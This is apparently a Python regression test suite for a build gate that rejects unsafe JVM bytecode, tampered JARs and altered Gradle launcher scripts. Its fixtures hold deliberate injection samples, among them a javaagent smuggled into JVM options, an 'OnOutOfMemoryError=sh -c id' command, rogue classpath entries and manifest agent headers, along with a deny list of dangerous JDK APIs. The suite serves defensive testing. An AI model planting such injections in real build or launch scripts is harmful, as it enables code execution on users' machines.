"""Compiler-backed negative regression cases for the production bytecode gate."""
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
import unittest
from types import SimpleNamespace
from unittest import mock
from zipfile import ZipFile

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))
from check_production_bytecode import (
    compiled_classes, validate_launch_scripts, validate_module_jar, violations_for_class
)


class ProductionBytecodeGateTest(unittest.TestCase):
    def setUp(self):
        if not shutil.which("javac"):
            self.fail("javac required for bytecode verification regression tests")
        self.workspace = tempfile.TemporaryDirectory()
        self.addCleanup(self.workspace.cleanup)
        self.module = Path(self.workspace.name) / "core" / "tasks"
        self.classes = self.module / "build/classes/java/main"
        self.classes.mkdir(parents=True)

    def compile(self, statements):
        source = self.module / "Example.java"
        source.write_text("public class Example {\n" + statements + "\n}\n", encoding="utf-8")
        result = subprocess.run(["javac", "-d", str(self.classes), str(source)],
                                text=True, capture_output=True)
        self.assertEqual(result.returncode, 0, result.stderr)
        return self.classes / "Example.class"

    def test_kotlin_class_literal_equivalent_is_caught_at_jvm_level(self):
        cls = self.compile("""
            void run() throws Exception {
                java.lang.reflect.Method method =
                    Example.class.getMethods()[0];
                method.invoke(this);
            }
        """)
        issues = violations_for_class(cls, "core/tasks")
        self.assertTrue(any("java/lang/Class.getMethods" in text for text in issues))
        self.assertTrue(any("java/lang/reflect/Method" in text for text in issues))

    def test_declared_methods_and_context_class_loader_are_denied(self):
        cls = self.compile("""
            void run() throws Exception {
                Example.class.getDeclaredMethods();
                Thread.currentThread().getContextClassLoader().loadClass("Example");
            }
        """)
        issues = violations_for_class(cls, "core/tasks")
        self.assertTrue(any("getDeclaredMethods" in text for text in issues))
        self.assertTrue(any("getContextClassLoader" in text for text in issues))
        self.assertTrue(any("ClassLoader.loadClass" in text for text in issues))

    def test_compiler_generated_lambda_metafactory_is_permitted(self):
        cls = self.compile('void run() { Runnable task = () -> { }; task.run(); }')
        self.assertEqual([], violations_for_class(cls, "core/tasks"))

    def test_jdk21_compiler_type_switch_bootstrap_is_permitted(self):
        source = self.module / "TypeSwitchFixture.java"
        source.write_text("""
            public class TypeSwitchFixture {
                static String format(Object value) {
                    return switch (value) {
                        case Integer number -> "int";
                        case String text -> "string";
                        default -> "other";
                    };
                }
            }
        """, encoding="utf-8")
        result = subprocess.run(["javac", "-d", str(self.classes), str(source)],
                                text=True, capture_output=True)
        self.assertEqual(result.returncode, 0, result.stderr)
        issues = violations_for_class(self.classes / "TypeSwitchFixture.class", "core/tasks")
        self.assertEqual([], issues)

    def test_arbitrary_invokedynamic_bootstrap_is_rejected(self):
        # javac records use java/lang/runtime/ObjectMethods.bootstrap, which is
        # NOT on the narrowly reviewed Kotlin/Java compiler bootstrap allowlist.
        source = self.module / "OtherRecord.java"
        source.write_text("record OtherRecord(int value) {}\n", encoding="utf-8")
        result = subprocess.run(["javac", "-d", str(self.classes), str(source)],
                                text=True, capture_output=True)
        self.assertEqual(result.returncode, 0, result.stderr)
        issues = violations_for_class(self.classes / "OtherRecord.class", "core/tasks")
        self.assertTrue(any("unreviewed JVM invokedynamic bootstrap" in x
                            for x in issues), issues)

    def test_jar_injected_class_is_rejected_even_if_not_a_dependency(self):
        original = self.compile("void run() { }")
        classes, issues = compiled_classes(self.module)
        self.assertEqual([], issues)
        jar_dir = self.module / "build/libs"
        jar_dir.mkdir(parents=True)
        with ZipFile(jar_dir / "tasks.jar", "w") as archive:
            archive.write(original, arcname="Example.class")
            archive.writestr("Malicious.class", original.read_bytes())
        _, errors = validate_module_jar(self.module, classes)
        self.assertTrue(any("Malicious.class did not come" in item for item in errors))

    def test_jar_replacement_of_compiled_class_is_rejected(self):
        original = self.compile("void run() { }")
        classes, issues = compiled_classes(self.module)
        self.assertEqual([], issues)
        jar_dir = self.module / "build/libs"
        jar_dir.mkdir(parents=True)
        with ZipFile(jar_dir / "tasks.jar", "w") as archive:
            archive.writestr("Example.class", original.read_bytes() + b"evil")
        _, errors = validate_module_jar(self.module, classes)
        self.assertTrue(any("differs from compiler output" in item for item in errors))


    def test_url_classloader_and_service_loader_are_rejected(self):
        cls = self.compile("""
            void run() throws Exception {
                java.net.URLClassLoader loader = new java.net.URLClassLoader(
                    new java.net.URL[]{new java.net.URL("https://example.invalid/x.jar")},
                    null);
                java.util.ServiceLoader.load(Runnable.class, loader).iterator();
            }
        """)
        issues = violations_for_class(cls, "core/tasks")
        self.assertTrue(any("java/net/URLClassLoader" in x for x in issues), issues)
        self.assertTrue(any("java/util/ServiceLoader" in x for x in issues), issues)

    def test_secure_class_loader_and_inherited_define_class_are_rejected(self):
        self.compile("""
            static class Loader extends java.security.SecureClassLoader {
                Class<?> inject(byte[] bytes) {
                    return defineClass(null, bytes, 0, bytes.length);
                }
            }
        """)
        cls = self.classes / "Example$Loader.class"
        issues = violations_for_class(cls, "core/tasks")
        self.assertTrue(any("java/security/SecureClassLoader" in x for x in issues), issues)
        self.assertTrue(any(".defineClass" in x for x in issues), issues)

    def test_java_beans_script_engine_and_module_open_are_rejected(self):
        cls = self.compile("""
            void run() throws Exception {
                new java.beans.Statement(this, "run", new Object[0]).execute();
                new javax.script.ScriptEngineManager().getEngineByName("js");
                Example.class.getModule().addOpens("example", Example.class.getModule());
            }
        """)
        issues = violations_for_class(cls, "core/tasks")
        for marker in ("java/beans/Statement", "javax/script/ScriptEngineManager",
                       "java/lang/Module.addOpens"):
            self.assertTrue(any(marker in x for x in issues), (marker, issues))

    def test_unknown_jdk_package_is_rejected(self):
        cls = self.compile("""
            void run() throws Exception {
                java.sql.DriverManager.getConnection("jdbc:unexpected");
            }
        """)
        issues = violations_for_class(cls, "core/tasks")
        self.assertTrue(any("java/sql/DriverManager" in x for x in issues), issues)

    def test_kotlin_callable_reflection_is_denied_but_metadata_is_allowed(self):
        info = SimpleNamespace(
            references={"kotlin/reflect/KClass"},
            method_references={("kotlin/reflect/KCallable", "call",
                                "([Ljava/lang/Object;)Ljava/lang/Object;")},
            method_handle_references=set(),
            bootstrap_references=set(),
        )
        with mock.patch("check_production_bytecode.parse_class", return_value=info):
            issues = violations_for_class(self.classes / "Example.class", "core/tasks")
        self.assertTrue(any("kotlin/reflect/KCallable.call" in x for x in issues), issues)
        info.method_references = {
            ("kotlin/reflect/KClass", "getSimpleName", "()Ljava/lang/String;")
        }
        with mock.patch("check_production_bytecode.parse_class", return_value=info):
            self.assertEqual([], violations_for_class(
                self.classes / "Example.class", "core/tasks"))

    def test_forbidden_manifest_classpath_and_agents(self):
        original = self.compile("void run() { }")
        classes, issues = compiled_classes(self.module)
        self.assertEqual([], issues)
        jar_dir = self.module / "build/libs"
        jar_dir.mkdir(parents=True)
        with ZipFile(jar_dir / "tasks.jar", "w") as archive:
            archive.write(original, arcname="Example.class")
            archive.writestr("META-INF/MANIFEST.MF",
                             "Manifest-Version: 1.0\r\nClass-Path: evil.jar\r\n"
                             "Launcher-Agent-Class: Malicious\r\n\r\n")
        _, errors = validate_module_jar(self.module, classes)
        self.assertTrue(any("manifest attribute Class-Path" in x for x in errors))
        self.assertTrue(any("manifest attribute Launcher-Agent-Class" in x
                            for x in errors))

    def test_launcher_templates_reject_every_reviewed_injection(self):
        root = Path(self.workspace.name)
        directory = root / "build/install/recursive-coder/bin"
        reference = root / "trusted-launchers"
        directory.mkdir(parents=True)
        reference.mkdir()
        unix = directory / "recursive-coder"
        windows = directory / "recursive-coder.bat"
        baseline_unix = "CLASSPATH=$APP_HOME/lib/tasks.jar\n"
        baseline_windows = "set CLASSPATH=%APP_HOME%\\lib\\tasks.jar\n"
        unix.write_text(baseline_unix, encoding="utf-8")
        windows.write_text(baseline_windows, encoding="utf-8")
        (reference / unix.name).write_text(baseline_unix, encoding="utf-8")
        (reference / windows.name).write_text(baseline_windows, encoding="utf-8")
        self.assertEqual([], validate_launch_scripts(root, {"tasks.jar"}, reference))

        variants = (
            ('DEFAULT_JVM_OPTS=\'"-java""agent:$APP_HOME/x/a.jar"\'\n' +
             baseline_unix, "unix quote-split javaagent"),
            ('export CLASSPATH="$CLASSPATH:$APP_HOME/x/evil.jar"\n' +
             baseline_unix, "unix exported classpath"),
            ('DEFAULT_JVM_OPTS=\'"@$APP_HOME/x/opts" '
             '"-XX:OnOutOfMemoryError=sh -c id"\'\n' +
             baseline_unix, "unix JVM argfile/options"),
            (baseline_unix + 'exec "$JAVACMD" -Djava.system.class.loader=Evil '
             '-classpath "$CLASSPATH"\n', "unix substituted exec"),
        )
        for content, label in variants:
            with self.subTest(variant=label):
                unix.write_text(content, encoding="utf-8")
                problems = validate_launch_scripts(root, {"tasks.jar"}, reference)
                self.assertTrue(any("differs from trusted Gradle template" in p
                                    for p in problems), problems)
        unix.write_text(baseline_unix, encoding="utf-8")
        windows.write_text('SET CLASSPATH=%CLASSPATH%;%APP_HOME%\\x\\evil.jar\n',
                           encoding="utf-8")
        self.assertTrue(validate_launch_scripts(root, {"tasks.jar"}, reference))
        windows.write_text(baseline_windows, encoding="utf-8")

        cygwin = 'CLASSPATH=$( cygpath --path --mixed "$CLASSPATH" )\n'
        unix.write_text(baseline_unix + cygwin, encoding="utf-8")
        (reference / unix.name).write_text(baseline_unix + cygwin,
                                           encoding="utf-8")
        self.assertEqual([], validate_launch_scripts(root, {"tasks.jar"}, reference))
        unix.write_text(baseline_unix + cygwin + baseline_unix, encoding="utf-8")
        self.assertTrue(any("expected one static CLASSPATH" in issue
                            for issue in validate_launch_scripts(root, {"tasks.jar"},
                                                                 reference)))

    def test_forged_classpath_assignment_before_genuine_is_rejected(self):
        root = Path(self.workspace.name)
        directory = root / "build/install/recursive-coder/bin"
        reference = root / "trusted-launchers"
        directory.mkdir(parents=True, exist_ok=True)
        reference.mkdir(exist_ok=True)
        unix = directory / "recursive-coder"
        windows = directory / "recursive-coder.bat"
        valid_unix = "CLASSPATH=$APP_HOME/lib/tasks.jar\n"
        valid_windows = "set CLASSPATH=%APP_HOME%\\lib\\tasks.jar\n"
        (reference / unix.name).write_text(valid_unix, encoding="utf-8")
        (reference / windows.name).write_text(valid_windows, encoding="utf-8")

        unix.write_text(
            "CLASSPATH=$APP_HOME/lib/rogue.jar\n" + valid_unix,
            encoding="utf-8",
        )
        windows.write_text(valid_windows, encoding="utf-8")
        problems = validate_launch_scripts(root, {"tasks.jar"}, reference)
        self.assertTrue(
            any("expected one static CLASSPATH" in issue for issue in problems),
            problems,
        )

        unix.write_text(valid_unix, encoding="utf-8")
        windows.write_text(
            "SET CLASSPATH=%APP_HOME%\\lib\\rogue.jar\n" + valid_windows,
            encoding="utf-8",
        )
        problems = validate_launch_scripts(root, {"tasks.jar"}, reference)
        self.assertTrue(
            any("expected one static CLASSPATH" in issue for issue in problems),
            problems,
        )

    def test_non_jar_install_payloads_and_symlinks_are_rejected(self):
        from check_production_bytecode import validate_install_distribution
        root = Path(self.workspace.name)
        lib = root / "build/install/recursive-coder/lib"
        bin_dir = lib.parent / "bin"
        lib.mkdir(parents=True)
        bin_dir.mkdir(parents=True)
        jar = self.module / "build/libs/tasks.jar"
        jar.parent.mkdir(parents=True)
        jar.write_bytes(b"trusted module")
        (lib / jar.name).write_bytes(jar.read_bytes())
        (bin_dir / "recursive-coder").write_text("CLASSPATH=$APP_HOME/lib/tasks.jar\n")
        (bin_dir / "recursive-coder.bat").write_text(
            "set CLASSPATH=%APP_HOME%\\lib\\tasks.jar\n")
        home = root / "gradle-home"
        self.assertEqual([], validate_install_distribution(root, [jar], home))
        for relative in ("lib/opts", "conf/agent.jar", "x/evil.jar"):
            with self.subTest(extra=relative):
                file = lib.parent / relative
                file.parent.mkdir(parents=True, exist_ok=True)
                file.write_bytes(b"unreviewed")
                self.assertTrue(any("unreviewed installed distribution entry" in issue
                                    for issue in validate_install_distribution(root, [jar], home)))
                file.unlink()
                if file.parent != lib:
                    file.parent.rmdir()
        symlink = lib.parent / "x"
        symlink.symlink_to(lib, target_is_directory=True)
        self.assertTrue(validate_install_distribution(root, [jar], home))

    def test_runtime_classpath_manifest_restricts_external_jars(self):
        from check_production_bytecode import validate_install_distribution
        import hashlib
        root = Path(self.workspace.name)
        lib = root / "build/install/recursive-coder/lib"
        bin_dir = lib.parent / "bin"
        lib.mkdir(parents=True)
        bin_dir.mkdir(parents=True)
        internal = self.module / "build/libs/tasks.jar"
        internal.parent.mkdir(parents=True)
        internal.write_bytes(b"internal")
        (lib / internal.name).write_bytes(internal.read_bytes())
        (bin_dir / "recursive-coder").write_text(
            "CLASSPATH=$APP_HOME/lib/tasks.jar:$APP_HOME/lib/thirdparty.jar\n")
        (bin_dir / "recursive-coder.bat").write_text(
            "set CLASSPATH=%APP_HOME%\\lib\\tasks.jar;%APP_HOME%\\lib\\thirdparty.jar\n")
        external = lib / "thirdparty.jar"
        external.write_bytes(b"external")
        digest = hashlib.sha256(external.read_bytes()).hexdigest()
        cache = root / "gradle-home/caches/modules-2/files-2.1/example/thirdparty/1.0/x"
        cache.mkdir(parents=True)
        (cache / external.name).write_bytes(external.read_bytes())
        manifest = root / "runtime.sha256"
        manifest.write_text("other.jar\t" + digest + "\n")
        errors = validate_install_distribution(root, [internal], root / "gradle-home",
                                               runtime_manifest=manifest)
        self.assertTrue(any("absent from resolved application runtimeClasspath" in e
                            for e in errors), errors)
        manifest.write_text("thirdparty.jar\t" + digest + "\n")
        self.assertEqual([], validate_install_distribution(
            root, [internal], root / "gradle-home", runtime_manifest=manifest))

    def test_denied_foreign_deserialization_and_logging_jdk_paths(self):
        from check_production_bytecode import forbidden_jdk_owner
        for owner in ("java/lang/foreign/SymbolLookup",
                      "java/lang/foreign/Linker",
                      "java/io/ObjectInputStream", "java/util/logging/LogManager"):
            with self.subTest(owner=owner):
                self.assertTrue(forbidden_jdk_owner(owner))

    def test_cr_only_manifest_headers_are_inspected(self):
        original = self.compile("void run() {}")
        classes, issues = compiled_classes(self.module)
        self.assertEqual([], issues)
        jar_dir = self.module / "build/libs"
        jar_dir.mkdir(parents=True)
        with ZipFile(jar_dir / "tasks.jar", "w") as archive:
            archive.write(original, arcname="Example.class")
            archive.writestr("META-INF/MANIFEST.MF",
                             "Manifest-Version: 1.0\rClass-Pa\r th: injected.jar\r\r")
        _, errors = validate_module_jar(self.module, classes)
        self.assertTrue(any("manifest attribute Class-Path" in e for e in errors),
                        errors)



if __name__ == "__main__":
    unittest.main()
